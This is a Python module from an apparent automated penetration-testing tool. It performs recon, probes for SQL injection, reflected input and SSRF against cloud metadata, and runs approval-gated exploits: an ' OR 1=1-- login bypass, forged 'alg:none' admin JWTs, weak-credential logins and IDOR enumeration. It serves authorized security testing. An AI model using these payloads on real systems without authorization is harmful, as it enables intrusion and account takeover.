"""Active (attacking) VAPT checks - target-agnostic generic exploits.

Phases:
  recon   - GET-only discovery of safe, well-known endpoints (auto).
  detect  - low-impact probes that signal a likely vulnerability (auto).
  exploit - active exploitation that proves impact (requires approval).

Every request flows through http_client.HttpClient, which enforces scope boundaries.
Exploit functions additionally refuse to run unless approved=True is passed by the
orchestrator after the approval gate.
"""
from __future__ import annotations

import base64
import json
from typing import Any

from http_client import HttpClient, Response
from vapt_mvp import Evidence, Finding
from exploits import run_exploits, EXPLOIT_CATEGORIES
from crawler import crawl_target, CrawlResult

RECON_PATHS = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/ftp", "/rest/products/search?q="]
MARKER = "vaptprobe8731"


def _json(resp: Response) -> Any:
    try:
        return json.loads(resp.text)
    except (ValueError, TypeError):
        return None


def _token(data: Any) -> str | None:
    if isinstance(data, dict):
        auth = data.get("authentication")
        if isinstance(auth, dict) and auth.get("token"):
            return str(auth["token"])
        if data.get("token"):
            return str(data["token"])
    return None


def _require(approved: bool) -> None:
    if not approved:
        raise PermissionError("exploitation requires an approved exploit token")


# --- Recon (auto) --------------------------------------------------------
def recon(client: HttpClient) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    for path in RECON_PATHS:
        try:
            resp = client.get(path)
            results.append({"path": path, "status": resp.status, "content_type": resp.headers.get("Content-Type")})
        except Exception as error:
            results.append({"path": path, "status": None, "error": str(error)})
    return results


def deep_crawl(client: HttpClient, max_depth: int = 3, max_pages: int = 100) -> CrawlResult:
    """Perform deep crawling to discover attack surface."""
    return crawl_target(client, client.scope.base_url() + "/", max_depth=max_depth, max_pages=max_pages)


# --- Detection (auto, low impact) ---------------------------------------
def detect_sql_injection(client: HttpClient) -> Finding | None:
    """Generic SQL injection detection."""
    test_endpoints = ["/login", "/search", "/api/users", "/api/products", "/"]
    for endpoint in test_endpoints:
        try:
            resp = client.post(endpoint, json={"username": "'", "password": "test"})
            if resp.status >= 500 and any(p in resp.text.lower() for p in ["sql", "syntax", "sqlite", "mysql", "postgresql", "ora-"]):
                return Finding(
                    "sqli-login-error", "SQL error triggered on login endpoint", "high",
                    "A single quote in the login field produced a database error, indicating input is concatenated into a SQL query.",
                    [Evidence("response", {"status": resp.status, "snippet": resp.text[:200]})],
                    remediation="Use parameterized queries / an ORM for authentication lookups.")
        except Exception:
            continue
    return None


def detect_reflected_input(client: HttpClient) -> Finding | None:
    """Generic reflected input detection (XSS precursor)."""
    test_endpoints = ["/search", "/q", "/api/search", "/"]
    for endpoint in test_endpoints:
        try:
            resp = client.get(f"{endpoint}?q={MARKER}")
            if MARKER in resp.text:
                return Finding(
                    "reflected-search-input", "Search input reflected in response", "medium",
                    "The endpoint reflects the raw query back in its response, a precursor to XSS if rendered unsafely.",
                    [Evidence("response", {"status": resp.status, "reflected": True})], confidence="medium",
                    remediation="Encode user input on output and apply a strict Content-Security-Policy.")
        except Exception:
            continue
    return None


def detect_ssrf(client: HttpClient) -> Finding | None:
    """Generic SSRF detection."""
    test_endpoints = ["/fetch", "/proxy", "/api/fetch", "/webhook", "/import"]
    for endpoint in test_endpoints:
        try:
            resp = client.post(endpoint, json={"url": "http://169.254.169.254/latest/meta-data/"})
            if "ami-id" in resp.text or "instance-id" in resp.text:
                return Finding(
                    "ssrf-metadata", "SSRF: Internal metadata service accessible", "critical",
                    "The fetch endpoint can reach internal cloud metadata service.",
                    [Evidence("response", {"status": resp.status, "snippet": resp.text[:200]})],
                    remediation="Block access to internal IP ranges. Validate and sanitize user-supplied URLs.")
        except Exception:
            continue
    return None


# --- Exploitation (gated: approved=True required) ------------------------
def exploit_sql_login_bypass(client: HttpClient, approved: bool) -> tuple[Finding | None, str | None]:
    _require(approved)
    resp = client.post("/login", json={"username": "' OR 1=1--", "password": "x"})
    token = _token(_json(resp))
    if resp.status == 200 and token:
        return (Finding(
            "sqli-auth-bypass", "Authentication bypass via SQL injection", "critical",
            "A SQL injection payload in the login field returned a valid session token without valid credentials.",
            [Evidence("auth_token_prefix", token[:12] + "..."), Evidence("payload", "' OR 1=1--")],
            remediation="Use parameterized queries for authentication; never concatenate input into SQL."), token)
    return (None, None)


def exploit_generic(client: HttpClient, approved: bool, categories: list[str] | None = None,
                    endpoints: list[str] | None = None) -> list[Finding]:
    """Run generic exploit modules against the target."""
    _require(approved)
    return run_exploits(client, categories=categories, endpoints=endpoints)


def exploit_weak_login(client: HttpClient, approved: bool, candidates: list[dict[str, str]]) -> tuple[Finding | None, str | None]:
    _require(approved)
    for cred in candidates:
        resp = client.post("/login", json={"username": cred.get("username", cred.get("email")), "password": cred.get("password")})
        token = _token(_json(resp))
        if resp.status == 200 and token:
            return (Finding(
                "weak-credentials", "Weak or default credentials accepted", "high",
                f"The account {cred.get('username', cred.get('email'))} authenticated with a weak password.",
                [Evidence("account", cred.get("username", cred.get("email")))],
                remediation="Enforce a strong password policy and disable default/test accounts."), token)
    return (None, None)


def _forge_jwt_none(email: str) -> str:
    def seg(obj: Any) -> str:
        return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()
    return f"{seg({'alg': 'none', 'typ': 'JWT'})}.{seg({'data': {'email': email, 'role': 'admin'}, 'iat': 0})}."


def exploit_jwt_none(client: HttpClient, approved: bool, email: str = "admin@example.com",
                     probe_path: str = "/api/user") -> Finding | None:
    _require(approved)
    token = _forge_jwt_none(email)
    resp = client.get(probe_path, headers={"Authorization": f"Bearer {token}"})
    if resp.status == 200 and _json(resp) is not None:
        return Finding(
            "jwt-none-accepted", "Forged 'alg:none' JWT accepted", "critical",
            "The API accepted a JWT signed with the 'none' algorithm, allowing token forgery and identity spoofing.",
            [Evidence("probe_path", probe_path), Evidence("forged_token_prefix", token[:16] + "...")],
            remediation="Reject tokens whose alg is 'none'; pin the expected signing algorithm server-side.")
    return None


def exploit_idor(client: HttpClient, approved: bool, token: str | None,
                 object_ids: list[int] | None = None) -> Finding | None:
    """Generic IDOR test - tries to access other users' resources."""
    _require(approved)
    if not token:
        return None

    object_ids = object_ids or [1, 2, 3, 4, 5, 10, 100]
    base_paths = ["/api/users", "/api/orders", "/api/documents", "/api/accounts", "/api/baskets"]

    for base_path in base_paths:
        for obj_id in object_ids:
            try:
                resp = client.get(f"{base_path}/{obj_id}", headers={"Authorization": f"Bearer {token}"})
                if resp.status == 200 and _json(resp):
                    return Finding(
                        f"idor-{base_path.split('/')[-1]}", f"Insecure direct object reference on {base_path.split('/')[-1]}", "high",
                        f"Authenticated session could access {base_path} id {obj_id} belonging to another user.",
                        [Evidence("accessed_object", obj_id), Evidence("endpoint", base_path), Evidence("status", resp.status)],
                        remediation="Enforce per-user authorization checks on every object access.")
            except Exception:
                continue
    return None
